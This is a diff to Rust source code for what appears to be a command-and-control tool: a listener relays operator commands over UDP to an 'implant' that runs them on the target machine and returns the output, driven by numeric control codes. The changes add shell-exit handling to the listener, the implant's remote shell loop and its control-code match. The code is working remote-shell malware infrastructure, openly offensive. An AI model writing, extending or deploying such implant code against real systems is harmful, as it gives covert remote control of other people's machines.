@@ -165,6 +165,7 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
 // handles interaction with the implant via UDP
 // acts as a middleman between the implant and client
 // Control Codes:
+//
 // 69 => exit shell (if in one)
 // 3 => terminate connection with implant and revert back to listening mode
 // 4 => Send a single command for the implant to execute
@@ -172,7 +173,8 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
 // 6 => Have the implant execute a module
 // anything else => do nothing (sleep for 10 ms to allow client to unlock shared buffer)
 fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
-    println!("\n[+] Connection established by listener {}", lsn.id + 1);
+    let id = lsn.id + 1;
+    print!("\n[+] Connection established by listener {}\n", id);
     let mut is_interacting: bool = false;
     // memo keeps track of the last String contained within the shared buffer
     // used so that listener can check to see if shared buffer has been read from or written to by client
@@ -186,6 +188,11 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                 is_interacting = false;
                 let code: u8 = 69;
                 lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+            }
+            else if cc == 101 {
+                let code: u8 = 4;
+                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
+                is_interacting = false;
             }
             // otherwise interact with shell normally
             // simply being a middleman between client and implant
@@ -506,6 +513,11 @@ pub fn udp_shell(sock: &mut UdpSocket) {
         //Changed to include 1 because there was a bunch
         //being sent that didnt have anything
         let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
+        if cmd.contains("exit") || cmd.contains("Exit"){
+            let cmd_out = "Exiting Shell";
+            sock.send_to(cmd_out.as_bytes(), src);
+            break;
+        }
         let cmd_out = execute_cmd(cmd);
         sock.send_to(cmd_out.as_bytes(), src);
     }
@@ -658,7 +670,11 @@ fn imp_udp(lsn_addr: SocketAddr) {
                         sock.send_to(&mod_res, lsn_addr);
                     }
                 },
-                _u8 => todo!(),
+                //CC for exiting and coming back to shell (do nothing)
+                4 => {},
+                _u8 => {
+                    todo!()
+                },
             }
         }
     }
